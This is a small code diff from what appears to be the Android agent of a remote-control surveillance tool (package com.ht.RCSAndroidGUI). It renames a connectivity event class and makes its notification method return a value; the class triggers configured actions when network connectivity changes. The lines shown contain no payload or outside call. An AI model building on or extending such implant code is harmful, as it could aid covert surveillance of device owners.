@@ -9,9 +9,9 @@ import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerConnectivity;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class ConnectivityEvent extends EventBase implements Observer<Connectivity> {
+public class EventConnectivity extends EventBase implements Observer<Connectivity> {
 		/** The Constant TAG. */
-		private static final String TAG = "ConnectivityEvent";
+		private static final String TAG = "EventConnectivity";
 
 		private int actionOnExit, actionOnEnter;
 		private boolean inRange = false;
@@ -51,7 +51,7 @@ public class ConnectivityEvent extends EventBase implements Observer<Connectivit
 		}
 
 		// Viene richiamata dal listener (dalla dispatch())
-		public void notification(Connectivity c) {
+		public int notification(Connectivity c) {
 			Log.d("QZ", TAG + " Got connectivity status notification: " + c.isConnected());
 
 			// Nel range
@@ -64,6 +64,8 @@ public class ConnectivityEvent extends EventBase implements Observer<Connectivit
 				Log.d("QZ", TAG + " Connectivity OUT");
 				onExit();
 			}
+			
+			return 0;
 		}
 		
 		public void onEnter() {
